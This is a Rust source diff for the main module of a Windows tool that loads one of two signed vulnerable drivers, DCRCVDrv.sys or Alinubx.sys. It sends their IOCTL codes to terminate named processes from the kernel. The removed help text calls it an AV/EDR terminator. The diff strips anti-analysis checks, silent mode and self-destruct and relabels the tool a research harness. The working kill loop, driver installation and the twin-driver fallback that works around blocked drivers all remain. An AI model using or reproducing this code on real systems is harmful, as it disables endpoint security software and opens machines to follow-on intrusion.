@@ -2,19 +2,19 @@ mod config;
 mod drv;
 mod loader;
 mod obf;
-mod ops;
+mod reporting;
 mod targets;
+mod validation;
 
 use std::io::Write;
-use std::sync::atomic::{AtomicBool, Ordering};
-use std::{process, time::Duration};
+use std::{process, thread, time::Duration};
 
 use drv::Kind;
+use reporting::{Event, Output};
 
 const EXIT_OK: i32 = 0;
 const EXIT_NO_TARGET: i32 = 2;
 const EXIT_DRIVER_FAIL: i32 = 3;
-const EXIT_ENV: i32 = 5;
 
 fn flush_and_exit(code: i32) -> ! {
     let _ = std::io::stdout().flush();
@@ -22,7 +22,6 @@ fn flush_and_exit(code: i32) -> ! {
 }
 
 struct Opts {
-    silent: bool,
     repeat: bool,
     dry_run: bool,
     json: bool,
@@ -31,8 +30,6 @@ struct Opts {
     delay_ms: u64,
     jitter_ms: u64,
     max_attempts: u32,
-    self_destruct: bool,
-    skip_env_check: bool,
     no_fallback: bool,
     service_name: Option<String>,
     driver_path: Option<String>,
@@ -44,34 +41,81 @@ struct Opts {
 fn parse_args() -> Option<Opts> {
     let args: Vec<String> = std::env::args().collect();
     let mut o = Opts {
-        silent: false, repeat: false, dry_run: false, json: false,
-        list_mode: false, version: false, delay_ms: 0, jitter_ms: 0,
-        max_attempts: 0, self_destruct: false, skip_env_check: false,
+        repeat: false,
+        dry_run: false,
+        json: false,
+        list_mode: false,
+        version: false,
+        delay_ms: 0,
+        jitter_ms: 0,
+        max_attempts: 0,
         no_fallback: false,
-        service_name: None, driver_path: None, cli_names: None,
-        cli_config: None, driver_kind: None,
+        service_name: None,
+        driver_path: None,
+        cli_names: None,
+        cli_config: None,
+        driver_kind: None,
     };
     let mut i = 1;
     while i < args.len() {
         match args[i].as_str() {
-            "-s" | "--silent" => o.silent = true,
             "-r" | "--repeat" => o.repeat = true,
             "-d" | "--dry-run" => o.dry_run = true,
             "-j" | "--json" => o.json = true,
             "-l" | "--list" => o.list_mode = true,
             "-v" | "--version" => o.version = true,
-            "-x" | "--self-destruct" => o.self_destruct = true,
-            "--no-check" => o.skip_env_check = true,
-            "--no-fallback" => o.no_fallback = true,
-            "--delay" => { i += 1; if i < args.len() { o.delay_ms = args[i].parse().unwrap_or(0); } }
-            "--jitter" => { i += 1; if i < args.len() { o.jitter_ms = args[i].parse().unwrap_or(0); } }
-            "--max-attempts" => { i += 1; if i < args.len() { o.max_attempts = args[i].parse().unwrap_or(0); } }
-            "--svc" | "--service-name" => { i += 1; if i < args.len() { o.service_name = Some(args[i].clone()); } }
-            "--driver" => { i += 1; if i < args.len() { o.driver_path = Some(args[i].clone()); } }
-            "-k" | "--kind" => { i += 1; if i < args.len() { o.driver_kind = Some(args[i].clone()); } }
-            "-n" | "--names" => { i += 1; if i < args.len() { o.cli_names = Some(args[i].clone()); } }
-            "-c" | "--config" => { i += 1; if i < args.len() { o.cli_config = Some(args[i].clone()); } }
-            "-h" | "--help" => { print_help(); return None; }
+            "--delay" => {
+                i += 1;
+                if i < args.len() {
+                    o.delay_ms = args[i].parse().unwrap_or(0);
+                }
+            }
+            "--jitter" => {
+                i += 1;
+                if i < args.len() {
+                    o.jitter_ms = args[i].parse().unwrap_or(0);
+                }
+            }
+            "--max-attempts" => {
+                i += 1;
+                if i < args.len() {
+                    o.max_attempts = args[i].parse().unwrap_or(0);
+                }
+            }
+            "--svc" | "--service-name" => {
+                i += 1;
+                if i < args.len() {
+                    o.service_name = Some(args[i].clone());
+                }
+            }
+            "--driver" => {
+                i += 1;
+                if i < args.len() {
+                    o.driver_path = Some(args[i].clone());
+                }
+            }
+            "-k" | "--kind" => {
+                i += 1;
+                if i < args.len() {
+                    o.driver_kind = Some(args[i].clone());
+                }
+            }
+            "-n" | "--names" => {
+                i += 1;
+                if i < args.len() {
+                    o.cli_names = Some(args[i].clone());
+                }
+            }
+            "-c" | "--config" => {
+                i += 1;
+                if i < args.len() {
+                    o.cli_config = Some(args[i].clone());
+                }
+            }
+            "-h" | "--help" => {
+                print_help();
+                return None;
+            }
             _ => {}
         }
         i += 1;
@@ -80,33 +124,28 @@ fn parse_args() -> Option<Opts> {
 }
 
 fn print_help() {
-    println!("0xCr0ssCrush - DCRCVDrv.sys + Alinubx.sys dual-driver EDR terminator");
-    println!("Public PoCs for the two signed drivers abused by the");
-    println!("Cruciferra MaaS loader to kill AV/EDR (eSentire TRU, Aug 2026).");
+    println!("0xCr0ssCrush - Windows BYOVD research harness (DCRCVDrv.sys + Alinubx.sys)");
     println!();
     println!("usage: crosscrush.exe [options]");
     println!();
     println!("options:");
-    println!("  -k, --kind <dcrc|alinubx>  which driver to use (default: auto)");
-    println!("  -s, --silent               suppress all console output");
-    println!("  -r, --repeat               keep running, re-check targets");
-    println!("  -d, --dry-run              enumerate targets without killing");
-    println!("  -j, --json                 machine-readable JSON output");
-    println!("  -l, --list                 print target names and exit");
+    println!("  -k, --kind <dcrc|alinubx>  first driver to attempt (default: dcrc, twin fallback)");
+    println!("  -n, --names <csv>          target process name list");
+    println!("  -c, --config <path>        load target list from file");
+    println!("  -d, --dry-run              resolve targets and drivers, send no IOCTLs");
+    println!("  -j, --json                 machine-readable output (see docs/architecture.md)");
+    println!("  -l, --list                 print the effective target list and exit");
+    println!("  -r, --repeat               keep scanning until interrupted or --max-attempts");
+    println!("      --max-attempts <n>     stop after n scan passes (with --repeat)");
+    println!("      --delay <ms>           sleep before starting");
+    println!("      --jitter <ms>          add a timing variation to the scan interval");
+    println!("      --svc <name>           service name for the driver registration");
+    println!("      --driver <path>        driver file to load (validated by hash first)");
+    println!("      --no-fallback          single-driver run, no twin switch");
     println!("  -v, --version              print version and exit");
-    println!("  -x, --self-destruct        delete self after success");
-    println!("      --no-check             skip VM and debugger checks");
-    println!("      --no-fallback          single-driver run (no twin swap)");
-    println!("      --delay <ms>           sleep before executing");
-    println!("      --jitter <ms>          randomize repeat interval");
-    println!("      --max-attempts <n>     stop after n kill passes");
-    println!("      --svc <name>           custom service name");
-    println!("      --driver <path>        custom driver file path");
-    println!("  -n, --names <csv>          comma-separated target list");
-    println!("  -c, --config <path>        load targets from config file");
     println!("  -h, --help                 show this help");
     println!();
-    println!("exit codes: 0 ok, 2 no targets, 3 driver failed, 5 environment");
+    println!("exit codes: 0 ok, 2 no targets, 3 driver validation/load failure");
 }
 
 fn main() {
@@ -116,24 +155,21 @@ fn main() {
     };
 
     if opts.version {
-        println!("0xCr0ssCrush v0.1.0");
-        println!("DCRCVDrv.sys (0x2205C0) + Alinubx.sys (0x222024) kernel-process terminators");
+        println!("0xCr0ssCrush v0.1.0 (research build)");
+        println!("DCRCVDrv.sys (0x2205C0) + Alinubx.sys (0x222024) kernel-process primitives");
         return;
     }
 
-    if opts.silent {
-        let _ = unsafe { ops::silence_std_handles() };
-    }
-
     if opts.delay_ms > 0 {
-        std::thread::sleep(Duration::from_millis(opts.delay_ms));
+        thread::sleep(Duration::from_millis(opts.delay_ms));
     }
 
-    // Resolve which driver to drive: explicit -k wins, else auto-detect
-    // by probing the device paths.
-    // Preferred driver order. -k picks the first one we try, but the twins
-    // always fall back: if DCRCVDrv.sys is blocked on disk (hash block, AV
-    // policy, driver load refused) we drop Alinubx.sys and keep going.
+    let out = Output::new(opts.json);
+
+    // Preferred driver order. -k picks the first driver we attempt; the
+    // twin always stays in the queue. If DCRCVDrv.sys cannot be loaded
+    // the harness moves to Alinubx.sys, mirroring the operators' own
+    // redundancy approach.
     let preferred: Option<Kind>;
     if let Some(k) = &opts.driver_kind {
         preferred = match Kind::parse(k) {
@@ -147,7 +183,7 @@ fn main() {
         preferred = None;
     }
 
-    let names_str: Vec<String> = if let Some(n) = &opts.cli_names {
+    let names: Vec<String> = if let Some(n) = &opts.cli_names {
         config::parse_names_csv(n)
     } else if let Some(path) = &opts.cli_config {
         config::load_names_file(path).unwrap_or_default()
@@ -156,138 +192,213 @@ fn main() {
     };
 
     if opts.list_mode {
-        println!("targets: {}", names_str.len());
-        for n in &names_str { println!("  {n}"); }
+        println!("targets: {}", names.len());
+        for n in &names {
+            println!("  {n}");
+        }
         return;
     }
 
-    if names_str.is_empty() {
+    if names.is_empty() {
         println!("error: no target names specified");
         flush_and_exit(EXIT_NO_TARGET);
-    }
-
-    if !opts.skip_env_check {
-        if ops::detect_debugger() || ops::detect_vm() {
-            println!("aborted: analysis environment detected");
-            flush_and_exit(EXIT_ENV);
-        }
     }
 
     let mut order: Vec<Kind> = Kind::order();
     if opts.no_fallback {
         order = vec![preferred.unwrap_or(Kind::Dcrc)];
     } else if let Some(p) = preferred {
-        // Move the requested driver to the front of the queue.
         let mut tmp: Vec<Kind> = Vec::new();
         for k in order {
-            if k != p { tmp.push(k); }
+            if k != p {
+                tmp.push(k);
+            }
         }
         tmp.insert(0, p);
         order = tmp;
     }
 
-    // Try each driver in order: open the device first (maybe a leftover
-    // instance is already running), otherwise install + start + open.
-    // On failure we clean up whatever we created and move to the twin.
+    // Attempt each driver in order. The driver file is hash-validated
+    // before anything is registered with the SCM.
     let mut _drv_svc: Option<loader::DriverService> = None;
     let mut dev: Option<drv::CrossDev> = None;
     let mut kind: Kind = order[0];
 
     for k in order {
-        println!("[*] trying driver: {}", match k {
-            Kind::Dcrc => "dcrc (DCRCVDrv.sys)",
-            Kind::Alinubx => "alinubx (Alinubx.sys)",
-        });
-        match drv::CrossDev::open(k) {
-            Ok(d) => {
-                println!("[+] driver already loaded");
-                dev = Some(d);
-                kind = k;
-                break;
-            }
-            Err(_) => {}
+        out.emit(
+            Event::Info(format!("attempting driver {}", k.display_name())),
+            None,
+        );
+        if let Ok(d) = drv::CrossDev::open(k) {
+            out.emit(
+                Event::Info(format!(
+                    "{} already loaded, device reachable",
+                    k.display_name()
+                )),
+                None,
+            );
+            dev = Some(d);
+            kind = k;
+            break;
         }
-        let drv_file = ops::resolve_driver_path(&opts.driver_path.clone().unwrap_or_else(|| k.driver_file()));
-        let svc_name = opts.service_name.clone().unwrap_or_else(|| ops::random_service_name(k.svc_prefix().as_str()));
-        if let Ok(s) = loader::DriverService::install(&svc_name, &drv_file) {
-            if s.start().is_ok() {
-                match drv::CrossDev::open(k) {
-                    Ok(d) => {
-                        println!("[+] driver loaded and device opened");
-                        _drv_svc = Some(s);
-                        dev = Some(d);
-                        kind = k;
-                        break;
+
+        let drv_file = ops_resolve_driver(&opts, k);
+        match validation::validate_driver(&drv_file) {
+            Ok(digest) => {
+                out.emit(
+                    Event::Driver(
+                        k.display_name().to_string(),
+                        k.device_path(),
+                        format!("0x{:X}", k.ioctl()),
+                        digest[..16].to_string(),
+                    ),
+                    None,
+                );
+            }
+            Err(e) => {
+                out.emit(Event::Rejected(format!("{drv_file}: {e}")), None);
+                flush_and_exit(EXIT_DRIVER_FAIL);
+            }
+        }
+
+        let svc_name = opts
+            .service_name
+            .clone()
+            .unwrap_or_else(|| format!("{}{:06X}", k.svc_prefix(), unique_suffix()));
+        if let Ok((svc, created)) = loader::DriverService::install(&svc_name, &drv_file) {
+            if svc.start().is_ok() {
+                if let Ok(d) = drv::CrossDev::open(k) {
+                    out.emit(
+                        Event::Info(format!("{} loaded, device opened", k.display_name())),
+                        None,
+                    );
+                    if created {
+                        _drv_svc = Some(svc);
                     }
-                    Err(_) => {}
+                    dev = Some(d);
+                    kind = k;
+                    break;
                 }
             }
         }
-        // This driver refused us - roll back and try the twin.
-        // The DriverService handle cleans itself up (stop + delete) when
-        // it goes out of scope at the end of this loop iteration.
-        println!("[!] {} blocked or failed to load, falling back", match k {
-            Kind::Dcrc => "dcrc (DCRCVDrv.sys)",
-            Kind::Alinubx => "alinubx (Alinubx.sys)",
-        });
+        out.emit(
+            Event::Info(format!("{} refused, moving to twin", k.display_name())),
+            None,
+        );
     }
 
     if dev.is_none() {
-        println!("fatal: neither signed driver was usable (DCRCVDrv.sys + Alinubx.sys both blocked?)");
+        println!("fatal: neither DCRCVDrv.sys nor Alinubx.sys could be loaded");
         flush_and_exit(EXIT_DRIVER_FAIL);
     }
     let dev = dev.unwrap();
-    println!("[+] driver kind: {}", match kind {
-        Kind::Dcrc => "dcrc (DCRCVDrv.sys)",
-        Kind::Alinubx => "alinubx (Alinubx.sys)",
-    });
 
     if opts.dry_run {
-        let procs = targets::find_running(&names_str.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
-        if opts.json {
-            println!("{{\"mode\":\"dry-run\",\"targets\":[{}]}}", procs.iter().map(|(n, p)| format!("{{\"name\":\"{n}\",\"pid\":{p}}}")).collect::<Vec<_>>().join(","));
-        } else {
-            println!("dry-run: {} target(s) present", procs.len());
-            for (n, p) in &procs { println!("  {n} ({p})"); }
+        let procs = targets::find_running(&names.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
+        for (name, pid) in &procs {
+            out.emit(Event::KillResolved(name.clone(), *pid), None);
         }
+        out.emit(
+            Event::Summary {
+                submitted: 0,
+                resolved: procs.len(),
+            },
+            None,
+        );
         drop(dev);
-        flush_and_exit(if procs.is_empty() { EXIT_NO_TARGET } else { EXIT_OK });
+        flush_and_exit(if procs.is_empty() {
+            EXIT_NO_TARGET
+        } else {
+            EXIT_OK
+        });
     }
 
-    let stop = AtomicBool::new(false);
     let mut attempt: u32 = 0;
-    let mut total_killed = 0usize;
+    let mut submitted = 0usize;
+    let mut resolved = 0usize;
 
     loop {
         attempt += 1;
-        let procs = targets::find_running(&names_str.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
-        let mut killed = 0usize;
-
+        let procs = targets::find_running(&names.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
         for (name, pid) in &procs {
+            out.emit(Event::KillResolved(name.clone(), *pid), None);
+            resolved += 1;
             match dev.kill_pid(kind, *pid) {
-                Ok(()) => {
-                    killed += 1;
-                    println!("(+) terminated {name} ({pid})");
+                Ok(_) => {
+                    submitted += 1;
+                    out.emit(
+                        Event::KillSubmitted {
+                            pid: *pid,
+                            ok: true,
+                        },
+                        None,
+                    );
                 }
                 Err(e) => {
-                    println!("error: {name} ({pid}): {e}");
+                    out.emit(
+                        Event::KillResult {
+                            pid: *pid,
+                            result: "error",
+                            detail: e,
+                        },
+                        Some(*pid),
+                    );
                 }
             }
         }
-        total_killed += killed;
 
-        if !opts.repeat || (opts.max_attempts > 0 && attempt >= opts.max_attempts) { break; }
-        ops::jitter_sleep(3000, opts.jitter_ms);
-        if stop.load(Ordering::SeqCst) { break; }
+        if !opts.repeat || (opts.max_attempts > 0 && attempt >= opts.max_attempts) {
+            break;
+        }
+        thread::sleep(Duration::from_millis(3000 + opts.jitter_ms));
     }
 
-    if opts.self_destruct {
-        if let Ok(exe) = std::env::current_exe() {
-            ops::purge_prefetch();
-            ops::self_destruct(&exe.to_string_lossy());
+    out.emit(
+        Event::Summary {
+            submitted,
+            resolved,
+        },
+        None,
+    );
+    drop(dev);
+    flush_and_exit(if submitted > 0 {
+        EXIT_OK
+    } else {
+        EXIT_NO_TARGET
+    });
+}
+
+fn ops_resolve_driver(opts: &Opts, k: Kind) -> String {
+    // Resolve the driver path exactly as stored metadata expects:
+    // absolute paths pass through, otherwise the file is looked up
+    // next to the executable and in the current directory.
+    let fname = opts.driver_path.clone().unwrap_or_else(|| k.driver_file());
+    if std::path::Path::new(&fname).is_absolute() {
+        return fname;
+    }
+    if let Ok(exe) = std::env::current_exe() {
+        if let Some(dir) = exe.parent() {
+            let cand = dir.join(&fname);
+            if cand.exists() {
+                return cand.to_string_lossy().to_string();
+            }
         }
     }
+    if let Ok(cwd) = std::env::current_dir() {
+        let cand = cwd.join(&fname);
+        if cand.exists() {
+            return cand.to_string_lossy().to_string();
+        }
+    }
+    fname
+}
 
-    drop(dev);
-    flush_and_exit(if total_killed > 0 { EXIT_OK } else { EXIT_NO_TARGET });
+/// Derive a unique service-name suffix from runtime state so that
+/// repeated runs of the harness do not collide with stale registrations.
+fn unique_suffix() -> u64 {
+    use windows::Win32::System::SystemInformation::GetTickCount64;
+    use windows::Win32::System::Threading::GetCurrentProcessId;
+    let tick = unsafe { GetTickCount64() };
+    let pid = unsafe { GetCurrentProcessId() };
+    (tick ^ pid as u64) & 0xFFFFFF
 }
